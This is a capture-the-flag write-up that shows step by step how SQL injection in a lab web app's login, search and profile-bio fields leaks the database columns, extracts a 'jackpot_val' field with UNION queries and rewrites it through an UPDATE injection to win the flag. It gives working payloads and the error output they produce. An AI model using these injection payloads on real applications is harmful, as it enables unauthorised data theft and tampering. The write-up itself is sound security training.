# Challenge `Money, money, money!`

* **Flag:** `SSof{Can_you_UPDATE_your_tokens}`
* **Vulnerability:** SQL Injection on both `SELECT` and `UPDATE` queries
* **Where:** Login form error disclosure, blog post search input (`SELECT`), and profile bio update field (`UPDATE`)
* **Impact:** Allows extraction and manipulation of sensitive database values (`jackpot_val`), enabling attackers to fraudulently trigger the jackpot reward.

---

## Steps to reproduce

1. After logging out from the admin account, attempt to log in using the following payload in the username field (without a SQL comment):

```sql
admin' or 1=1
```

This generates the following SQL error:

```
(sqlite3.OperationalError) near "' AND password = '": syntax error [SQL: SELECT id, username, password, bio, age, jackpot_val FROM user WHERE username = 'admin' or 1=1' AND password = 'f4bf9f7fcbedaba0392f108c59d8f4a38b3838efb64877380171b54475c2ade8'] (Background on this error at: https://sqlalche.me/e/14/e3q8)
```

2. From the error message, it is possible to enumerate the exact columns of the `user` table:

```
id, username, password, bio, age, jackpot_val
```

This reveals the existence of the sensitive field `jackpot_val`.

3. Create and log into a normal user account. A new user is created with:

```
username: tomas  
password: tomas
```

The account is then used to log into the application.

4. Extract jackpot values via UNION-based SQL Injection. In the blog post search input, the following payload is injected:

```sql
' UNION SELECT 1, jackpot_val, jackpot_val FROM user WHERE username='admin' -- 
```

This reveals the admin jackpot value in the blog posts HTML output:

```
0
```

The same method is applied to the attacker-controlled account:

```sql
' UNION SELECT 1, jackpot_val, jackpot_val FROM user WHERE username='tomas' -- 
```

Which returns:

```
59564
```

5. Now you need some way to update the table of the user so that the jackpot_val becomes 0. In the profile page of user `tomas`, an intentional SQL syntax error is triggered in the "Bio" field using:

```sql
'x
```

This produces the following backend error:

```
(sqlite3.OperationalError) near "x": syntax error [SQL: UPDATE user SET bio = ''x ' WHERE username = 'tomas'] (Background on this error at: https://sqlalche.me/e/14/e3q8)
```

This discloses the exact `UPDATE` query structure being used.

6. Using the revealed query structure, the following payload is injected into the "Bio" field:

```sql
', jackpot_val=0, username='tomas
```

The original query already appends a `'` at the end. So "username='tomas" restores the correct syntax.


7. Immediately after clicking the "Update Profile" button with the malicious update, the application displays:

```
JACKPOT! Here is your secret: SSof{Can_you_UPDATE_your_tokens}
```